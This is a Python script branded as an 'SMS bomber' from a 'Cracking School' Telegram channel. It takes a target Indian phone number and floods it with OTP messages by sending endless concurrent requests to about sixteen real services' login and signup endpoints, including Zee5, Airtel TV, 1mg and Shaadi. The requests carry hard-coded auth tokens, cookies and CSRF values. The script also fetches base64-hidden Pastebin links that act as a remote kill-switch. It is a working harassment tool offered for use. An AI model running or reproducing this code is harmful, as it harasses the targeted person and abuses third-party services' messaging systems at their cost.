import requests
import json
import concurrent.futures
import sys
import time
import threading
from itertools import cycle
import os
from datetime import datetime

stop_flag = False

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    BLACK = '\033[30m'
    MAGENTA = '\033[35m'
    WHITE = '\033[37m'

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def an_t(text, delay=0.03, color=Colors.CYAN):
    for char in text:
        sys.stdout.write(color + char + Colors.END)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def ty_e(text, delay=0.05, color=Colors.GREEN):
    for char in text:
        sys.stdout.write(color + char + Colors.END)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def ld_an(duration=1.5, message="Loading"):
    animation = cycle(['◐', '◓', '◑', '◒', '◍', '◎', '◌', '○', '●', '◍'])
    start_time = time.time()
    while time.time() - start_time < duration:
        sys.stdout.write(f"\r{Colors.YELLOW}{next(animation)} {message}{Colors.END}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 50 + "\r")

def pu_ef(text, duration=2, color=Colors.MAGENTA):
    end_time = time.time() + duration
    while time.time() < end_time:
        for brightness in range(0, 100, 20):
            sys.stdout.write(f"\r{color}{'█' * (brightness // 10)} {text} {'█' * (brightness // 10)}{Colors.END}")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")

def open_telegram(is_update=False, is_expired=False):
    """Open the Telegram channel in default browser"""
    telegram_url = "https://t.me/cracking_school_2"
    try:
        if is_expired:
            an_t("🔴 Script Expired Opening Channel!", delay=0.03, color=Colors.RED)
        elif is_update:
            an_t("📱 Opening Telegram For Update!", delay=0.03, color=Colors.CYAN)
        else:
            an_t("📱 Please Join Our Channel For More Updates!", delay=0.03, color=Colors.CYAN)
        print()
        ld_an(2, "Opening Telegram")
        
        # Check if running in Termux
        if os.path.exists('/data/data/com.termux'):  # Termux
            os.system(f'termux-open "{telegram_url}"')
        elif os.name == 'nt':  # Windows
            os.startfile(telegram_url)
        elif os.name == 'posix':  # Linux/Mac
            if os.path.exists('/usr/bin/xdg-open'):  # Linux
                os.system(f'xdg-open "{telegram_url}"')
            else:  # Mac
                os.system(f'open "{telegram_url}"')
    except Exception as e:
        print(f"{Colors.YELLOW}⚠️ Could not open browser. Visit manually: {telegram_url}{Colors.END}")

def chk_upd():
    """Check for updates from pastebin"""
    try:
        import base64
        chdhs = b'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzdWTkw5OERR'
        u = base64.b64decode(chdhs).decode()
        r = requests.get(u, timeout=5)
        
        if r.status_code == 200:
            msg = r.text.strip().lower()
            
            # If raw data is empty or None, ignore and continue
            if not msg or msg == "none":
                return True
            
            # Check if it's a force update
            is_force = msg == "force update"
            
            # If there's a message, show it and ask user
            clr()
            print(f"\n{Colors.YELLOW}{'=' * 60}{Colors.END}")
            an_t(f"⚠️  {msg.upper()}", delay=0.03, color=Colors.YELLOW)
            print(f"{Colors.YELLOW}{'=' * 60}{Colors.END}\n")
            
            if is_force:
                # Force update - only allow update or close
                while True:
                    sys.stdout.write(f"{Colors.RED}Update is mandatory! (update/close): {Colors.END}")
                    sys.stdout.flush()
                    choice = input().strip().lower()
                    
                    if choice in ['update', 'u', 'y']:
                        open_telegram(is_update=True)
                        time.sleep(2)
                        sys.exit(0)
                    elif choice in ['close', 'c', 'n']:
                        print(f"{Colors.RED}Closing application...{Colors.END}")
                        time.sleep(1)
                        sys.exit(0)
                    else:
                        print(f"{Colors.RED}Invalid choice! Please enter 'update' or 'close'{Colors.END}")
                        continue
            else:
                # Optional update - allow skip or update
                while True:
                    sys.stdout.write(f"{Colors.CYAN}Do you want to update? (yes/no): {Colors.END}")
                    sys.stdout.flush()
                    choice = input().strip().lower()
                    
                    if choice in ['yes', 'y']:
                        open_telegram(is_update=True)
                        time.sleep(2)
                        sys.exit(0)
                    elif choice in ['no', 'n']:
                        print(f"{Colors.GREEN}Skipping update. Starting script...{Colors.END}\n")
                        time.sleep(1)
                        return True
                    else:
                        print(f"{Colors.RED}Invalid choice! Please enter 'yes' or 'no'{Colors.END}")
                        continue
        
        return True
            
    except Exception as e:
        print(f"\n{Colors.RED}⚠️ UPDATE CHECK FAILED: {str(e)[:50]}{Colors.END}")
        print(f"{Colors.RED}Continuing anyway...{Colors.END}")
        time.sleep(1)
        return True

def x9k3m():
    try:
        import base64
        chdhs = b'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzhpMWZxdmYy'
        u = base64.b64decode(chdhs).decode()
        r = requests.get(u, timeout=5)
        if r.status_code == 200:
            d = r.text.strip()
            dt_f = ["%d.%m.%Y", "%d.%m.%y",]
            
            for fmt in dt_f:
                try:
                    e = datetime.strptime(d, fmt)
                    n = datetime.now()
                    if n > e:
                        clr()
                        print(f"\n{Colors.RED}{'=' * 60}{Colors.END}")
                        an_t("⚠️ VERSION EXPIRED ⚠️", delay=0.03, color=Colors.RED)
                        an_t(f"EXPIRY DATE: {d}", delay=0.03, color=Colors.YELLOW)
                        an_t("CONTACT ADMIN FOR UPDATE", delay=0.03, color=Colors.RED)
                        print(f"{Colors.RED}{'=' * 60}{Colors.END}\n")
                        time.sleep(2)
                        print()
                        open_telegram(is_expired=True)
                        time.sleep(2)
                        sys.exit(1)
                    return
                except ValueError:
                    continue
            
            print(f"\n{Colors.RED}⚠️ UNRECOGNIZED DATE FORMAT: {d}{Colors.END}")
            print(f"{Colors.RED}Exiting for safety{Colors.END}")
            time.sleep(2)
            sys.exit(1)
            
    except Exception as e:
        print(f"\n{Colors.RED}⚠️ EXPIRY CHECK FAILED: {str(e)[:50]}{Colors.END}")
        print(f"{Colors.RED}Cannot verify - Exiting{Colors.END}")
        time.sleep(2)
        sys.exit(1)

def sh_bn():
    banner = """
   ╔══════════════════════════════════════════════════╗
   ║                                                  ║
   ║     ██████╗ ██████╗ ██████╗ ██████╗ █████╗       ║
   ║    ██╔════╝██╔═══██╗██╔══██╗██╔══██╗██╔══██╗     ║
   ║    ██║     ██║   ██║██████╔╝██████╔╝███████║     ║
   ║    ██║     ██║   ██║██╔══██╗██╔══██╗██╔══██║     ║
   ║    ╚██████╗╚██████╔╝██████╔╝██║  ██║██║  ██║     ║
   ║     ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ║
   ║                                                  ║
   ║            B O M B E R   V 1 . 0 . 1             ║
   ║                                                  ║
   ║               𝗕𝗬  𝗖𝗥𝗔𝗖𝗞𝗜𝗡𝗚  𝗦𝗖𝗛𝗢𝗢𝗟               ║
   ╚══════════════════════════════════════════════════╝
    """
    
    terminal_width = os.get_terminal_size().columns
    for line in banner.split('\n'):
        if line.strip():
            centered = line.center(terminal_width)
            an_t(centered, delay=0.0015, color=Colors.RED)
            time.sleep(0.05)
        else:
            print()
    
    print(f"\n{Colors.YELLOW}{'═' * terminal_width}{Colors.END}")

def gt_pn():
    while True:
        sys.stdout.write(f"\n{Colors.GREEN}(Testing)Enter Target number: {Colors.CYAN}")
        sys.stdout.flush()
        mobile = input().strip()
        
        mobile = ''.join(filter(str.isdigit, mobile))
        
        if len(mobile) == 10:
            ld_an(0.8, "Validating number")
            print(f"{Colors.GREEN}✓ Target locked: {mobile}{Colors.END}\n")
            return mobile
        elif len(mobile) == 12 and mobile.startswith('91'):
            mobile = mobile[2:]
            ld_an(0.8, "Validating number")
            print(f"{Colors.GREEN}✓ Target locked: {mobile}{Colors.END}\n")
            return mobile
        else:
            print(f"\r{Colors.RED}✗ INVALID! Enter 10 digit number: {Colors.CYAN}", end="")
            continue

def snd_req(api, mobile, mobile_91, mobile_plus91):
    try:
        if api['name'] in ['Gokwik 1', 'Gokwik 2']:
            payload = {"phone": mobile, "country": "IN"}
        elif api['name'] == 'Noise':
            payload = {"value": mobile, "type": "phone"}
        elif api['name'] == 'Gokwik Validate':
            payload = {
                "cart_id": 592470021,
                "mid": "3mt5u7utwrl35l6ssa",
                "os_type": "Windows",
                "request_id": "e3673140-db47-425b-81b9-55ef26491207",
                "phone": mobile,
                "origin": "CORE_FE"
            }
        elif api['name'] == 'Gokwik KP':
            payload = {"phone": mobile, "country": "in", "country_code": "+91"}
        elif api['name'] == '1mg':
            payload = {"mobile_number": mobile, "source": "DWEB_PHARMA_HOME"}
        elif api['name'] == 'TMMumbai':
            payload = {
                "channel": "CHANNEL_SMS",
                "mobileNo": mobile,
                "platform": "PLATFORM_WEB",
                "source": "TM_WEBSITE_V_4.21.0",
                "retryCount": 1
            }
        elif api['name'] == 'KukuFM':
            payload = {"phone_number": mobile_plus91, "recaptcha_token": ""}
        elif api['name'] == 'PocketFM':
            payload = [{"phone_number": mobile_plus91, "country_code": "+91"}]
        elif api['name'] == 'Zee5':
            payload = {"phoneno": mobile_91}
        elif api['name'] == 'Shemaroome':
            payload = f"mobile_no={mobile_plus91}&registration_source=organic"
        elif api['name'] == 'Airtel TV':
            payload = {"msisdn": mobile, "msgTxt": "Use {OTP} as your login OTP. OTP is confidential"}
        elif api['name'] == 'DishTV':
            payload = {"mobile": mobile_91, "password": "123456", "additional_params": {"isOptedForPromotions": "true"}}
        elif api['name'] == 'Epicon':
            payload = f"_token=&stdisdcode=%2B91&mobile_number={mobile}&signup_method=MOBILE"
        elif api['name'] == 'VRott TV':
            payload = {"phno": mobile_91}
        elif api['name'] == 'Eros Now':
            payload = {"mobile": mobile, "calling_code": "+91"}
        elif api['name'] == 'Shaadi':
            payload = {"data": {"username": mobile, "type": "login"}}
        else:
            payload = api.get('payload', {})
        
        if api['method'] == 'POST':
            if api['name'] in ['Shemaroome', 'Epicon']:
                response = requests.post(
                    api['url'],
                    headers=api['headers'],
                    data=payload,
                    timeout=10
                )
            else:
                response = requests.post(
                    api['url'],
                    headers=api['headers'],
                    json=payload,
                    timeout=10
                )
        else:
            response = requests.get(
                api['url'],
                headers=api['headers'],
                timeout=10
            )
        
        return {
            's': response.status_code in [200, 201, 202, 204],
            'sc': response.status_code,
            'n': api['name']
        }
    except Exception as e:
        return {
            's': False,
            'e': str(e)[:60],
            'n': api['name']
        }

def snd_bt(apis, mobile, mobile_91, mobile_plus91):
    res = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(apis)) as ex:
        ft_to_api = {}
        for api in apis:
            ft = ex.submit(
                snd_req,
                api,
                mobile,
                mobile_91,
                mobile_plus91
            )
            ft_to_api[ft] = api
        
        for ft in concurrent.futures.as_completed(ft_to_api):
            res.append(ft.result())
    return res

def an_pb(ts):
    spinner = cycle(['◗', '◓', '◑', '◒'])
    cur_sp = next(spinner)
    
    progress = (ts % 50) / 50
    bar_len = 40
    filled = int(bar_len * progress)
    bar = '█' * filled + '░' * (bar_len - filled)
    
    sys.stdout.write(f"\r{Colors.CYAN}[{cur_sp}] {Colors.GREEN}{bar}{Colors.END} {Colors.MAGENTA}💣 {ts}{Colors.END} Messages Sent")
    sys.stdout.flush()

def main():
    global stop_flag
    
    x9k3m()
    chk_upd()
    clr()
    sh_bn()
    
    mobile = gt_pn()
    mobile_91 = f"91{mobile}"
    mobile_plus91 = f"+91{mobile}"
    
    terminal_width = os.get_terminal_size().columns
    print(f"{Colors.YELLOW}{'═' * terminal_width}{Colors.END}")
    
    ty_e(f"🎯 TARGET: {mobile}", delay=0.03, color=Colors.RED)
    print()
    print(f"{Colors.YELLOW}{'═' * terminal_width}{Colors.END}\n")
    
    pu_ef("🚀 INITIATING BOMBER 💣", duration=1.5, color=Colors.RED)
    print()
    
    apis = [
        {'name': 'Gokwik 1', 'url': 'https://gkx.gokwik.co/v3/gkstrict/auth/otp/send', 'method': 'POST', 'headers': {'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3NTEwOTc2NiwiZXhwIjoxNzc1MTA5ODI2fQ.jw8XbQwaxHA77Inz0YxFd8k5MVH5-4d-OOv20KpGc3s', 'Gk-Merchant-Id': '12wyqc2lkv1ku5f576t', 'Content-Type': 'application/json'}, 'payload': {}},
        {'name': 'Noise', 'url': 'https://app-eks.gonoise.com/website/v2/create/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'payload': {}},
        {'name': 'Gokwik 2', 'url': 'https://gkx.gokwik.co/v3/gkstrict/auth/otp/send', 'method': 'POST', 'headers': {'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3NTExMDM0NiwiZXhwIjoxNzc1MTEwNDA2fQ.XiL-0XiN_aFeFKxHCpf_oY-Yp7dPAAB-oAFUvfPBxFY', 'Gk-Merchant-Id': '12wyqc25h0kwcb8aqq', 'Content-Type': 'application/json'}, 'payload': {}},
        {'name': 'Gokwik Validate', 'url': 'https://api.gokwik.co/v1/user/validate/user', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'payload': {}},
        {'name': 'Gokwik KP', 'url': 'https://gkx.gokwik.co/kp/api/v1/auth/otp/send', 'method': 'POST', 'headers': {'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3NTExMTc4NCwiZXhwIjoxNzc1MTExODQ0fQ.6Td0YcSkVDKf68j99r1uGbpPvfx_nhnJLqhADCOW5ws', 'Content-Type': 'application/json', 'Gk-Request-Id': 'de9b629d-9a99-4b84-8f7b-cc8d047cc1ae', 'Gk-Merchant-Id': '19l4j3r9sh30'}, 'payload': {}},
        {'name': '1mg', 'url': 'https://www.1mg.com/pwa-dweb-api/api/labs/v1/lead/push_lead', 'method': 'POST', 'headers': {'Cookie': '_csrf=1822b9e080cb7efcfcfd58286375735259cb431ac646e7849cc69dd087b3ba7d5058acc971e4faa88c927666ea385d635d19fa0c8b782df5c525d74887d09109%7C802a13ae2acf72021f3c981605c43b497b89ae5dfb130f999c6f95d90619632e', 'X-Csrf-Token': '1822b9e080cb7efcfcfd58286375735259cb431ac646e7849cc69dd087b3ba7d5058acc971e4faa88c927666ea385d635d19fa0c8b782df5c525d74887d09109', 'Content-Type': 'application/json'}, 'payload': {}},
        {'name': 'PocketFM', 'url': 'https://pocketfm.com/login', 'method': 'POST', 'headers': {'Next-Action': '409bc47d2a18952706ecfba61644dd2566c3cb04c7'}, 'payload': {}},
        {'name': 'Zee5', 'url': 'https://auth.zee5.com/v1/user/sendotp', 'method': 'POST', 'headers': {'Esk': 'ZjUwNTkyMzctZGFhMy00OGRmLWIxMWUtOWZjZWE0MmJlYzIyX19nQlFhWkxpTmRHTjlVc0NLWmFsb2doejl0OVN0V0xTRF9fMTc3NTExMzk3NDM0Mg==', 'Accept': 'application/json', 'Device_id': 'f5059237-daa3-48df-b11e-9fcea42bec22', 'Content-Type': 'application/json'}, 'payload': {}},
        {'name': 'Hindustan Times', 'url': 'https://accounts.hindustantimes.com/v4/mobile/home', 'method': 'POST', 'headers': {'X-Platform': 'WEB', 'Content-Type': 'application/json', 'X-Client': '1001'}, 'payload': {}},
        {'name': 'Shemaroome', 'url': 'https://www.shemaroome.com/users/mobile_no_signup', 'method': 'POST', 'headers': {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': 'https://www.shemaroome.com/users/sign_in'}, 'payload': {}},
        {'name': 'Airtel TV', 'url': 'https://api.airtel.tv/v2/user/profile/generateOtp?appId=WEB', 'method': 'POST', 'headers': {'X-Atv-Utkn': 'OW__3FbxkEDeo_L35Kg6FlcSIb42:g7oh8sM9+4gTI7zkKuF4rgPgW1c=', 'X-Atv-Did': 'ca7a63aa-b489-44e7-87a7-5519ec34cdf9|BROWSER|WEBOS|10.0|93|75.0.20|pc|pc', 'Content-Type': 'application/json'}, 'payload': {}},
        {'name': 'DishTV', 'url': 'https://dishtv-api.revlet.net/service/api/auth/signup/validate', 'method': 'POST', 'headers': {'Box-Id': 'd5768ce4-084d-1ccd-a27f-a9bd4cdeb995', 'Content-Type': 'application/json', 'Session-Id': 'acdded91-9d4e-437c-ba03-bfd4f42237ec', 'Tenant-Code': 'dishtv'}, 'payload': {}},
        {'name': 'Epicon', 'url': 'https://www.epicon.in/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, 'payload': {}},
        {'name': 'VRott TV', 'url': 'https://api.vrott.tv/api/user/otpLoginOrRegister', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'payload': {}},
        {'name': 'Eros Now', 'url': 'https://pwaproxy.erosnow.com/api/v1/auth/users/verify', 'method': 'POST', 'headers': {'X-Platform': 'WEB', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json;charset=UTF-8'}, 'payload': {}},
        {'name': 'Shaadi', 'url': 'https://ww4.shaadi.com/api/otp/send', 'method': 'POST', 'headers': {'X-Platform': 'web', 'X-Access-Token': '38ae798a5ec763b50b1c6ef73872b9af2c3a73d96651e736504066aa35c1e982|guest|', 'Content-Type': 'application/json;charset=UTF-8'}, 'payload': {}},
    ]
    
    an_t("💣 ʙᴏᴍʙɪɴɢ sᴛᴀʀᴛᴇᴅ", delay=0.05, color=Colors.RED)
    an_t("🔴 Pʀᴇss Cᴛʀʟ+C ᴛᴏ sᴛᴏᴘ\n", delay=0.03, color=Colors.YELLOW)
    
    ts = 0
    start_time = time.time()
    
    try:
        while not stop_flag:
            res = snd_bt(apis, mobile, mobile_91, mobile_plus91)
            
            bt_s = sum(1 for r in res if r.get('s'))
            ts += bt_s
            
            an_pb(ts)
            
    except KeyboardInterrupt:
        elapsed_time = time.time() - start_time
        mins = int(elapsed_time // 60)
        secs = int(elapsed_time % 60)
        
        print("\n\n" + Colors.RED + "╔" + "═" * 58 + "╗" + Colors.END)
        print(Colors.RED + "║" + Colors.BOLD + " " * 15 + "📊 MISSION COMPLETE 📊" + " " * 17 + Colors.END + Colors.RED + "    ║" + Colors.END)
        print(Colors.RED + "╠" + "═" * 58 + "╣" + Colors.END)
        print(Colors.RED + "║" + Colors.END + f"  {Colors.GREEN}💣 TOTAL Messages:{Colors.YELLOW} {ts:>25}{Colors.END}  " + Colors.RED + "          ║" + Colors.END)
        print(Colors.RED + "║" + Colors.END + f"  {Colors.GREEN}🎯 TARGET NUMBER:{Colors.YELLOW} {mobile:>35}{Colors.END}  " + Colors.RED + " ║" + Colors.END)
        print(Colors.RED + "║" + Colors.END + f"  {Colors.GREEN}⏱️  DURATION:{Colors.YELLOW}                              {mins}m {secs}s{' ' * 7}{Colors.END}  " + Colors.RED + "║" + Colors.END)
        print(Colors.RED + "╚" + "═" * 58 + "╝" + Colors.END)
        
        an_t("🛑 𝗕𝗢𝗠𝗕𝗘𝗥 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 𝗕𝗬 𝗨𝗦𝗘𝗥", delay=0.03, color=Colors.RED)
        print(f"{Colors.GREEN}{'█' * 60}{Colors.END}\n")
        
        time.sleep(1)
        open_telegram()
        print(f"\n{Colors.CYAN}Waiting for browser to open...{Colors.END}")
        time.sleep(5)
        print(f"{Colors.YELLOW}Press Enter to exit...{Colors.END}")
        input()
        sys.exit(0)

if __name__ == "__main__":
    main()